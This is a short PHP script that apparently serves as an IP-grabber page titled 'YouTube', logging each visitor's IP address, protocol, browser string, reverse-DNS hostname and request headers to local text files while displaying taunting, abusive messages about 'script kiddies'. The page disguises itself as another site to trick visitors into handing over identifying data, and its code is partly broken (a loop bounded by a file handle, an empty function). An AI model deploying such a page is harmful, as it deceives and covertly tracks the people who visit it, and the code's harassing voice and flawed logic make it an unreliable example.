<?php
$IP = $_SERVER['REMOTE_ADDR'];
$proto = $_SERVER['SERVER_PROTOCOL']; 
$BROWSER = $_SERVER['HTTP_USER_AGENT'];
echo "<html> <head><title>YouTube</title><meta charset='utf-8'></head>";
echo "<body><h1>Your IP has been logged. Enjoy it bitch boy! LOL</h1><h2>$BROWSER os your Browser and OS LMAO!";
$Time = $_SERVER['REQUEST_TIME'];
$SOFTWARE = $_SERVER['SERVER_SOFTWARE'];
$HTTACCEPT = $_SERVER['HTTP_ACCEPT'];

$fh = fopen('log.txt', 'a');
if(empty($fh)){
fclose($fh);
}
for ($i = 0; $i <= $fh;$i++){
    fwrite($fh , $IP);
    fwrite($fh, $proto. "\nProtocol.");   
}
fclose($fh);
echo "$IP and your proto: $proto";
function dectorate(){
  
}
dectorate();
function Browser(){
    $BROWSER = $_SERVER['HTTP_USER_AGENT'];
    $fh = fopen("information.txt" ,"a");
    fwrite($fh, "\nBrowser information:\n ");
    fwrite($fh , $BROWSER);
}
function Rev_DNS(){
    $IP = $_SERVER['REMOTE_ADDR'];
    $REV_HST = gethostbyaddr($IP);
    echo "<h3>Your hostname is $REV_HST\n Enjoy it!</h3>";
    $fh = fopen("information.txt" , "a");
    fwrite($fh, "\nRemote Computer information:\n ");
    fwrite($fh , $REV_HST);
}
Rev_DNS();
Browser();
function Get_Header(){
    $HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
    $KCP = $_SERVER['HTTP_CONNECTION'];
$fh = fopen("information.txt" ,"a");
fwrite($fh, "\nHeader:\n\n");
fwrite($fh , $HTTACCEPT);
fwrite($fh , "$KCP");
};
Get_Header();
    function Serv_Port(){
        $SERVER_PORT = $_SERVER['SERVER_PORT'];
        echo "The Port you are connected to lmfao $SERVER_PORT";
        echo "<pre>This is why i love script kiddies! They don't know jack shit but threaten!</pre>";
    }
    Serv_Port();

?>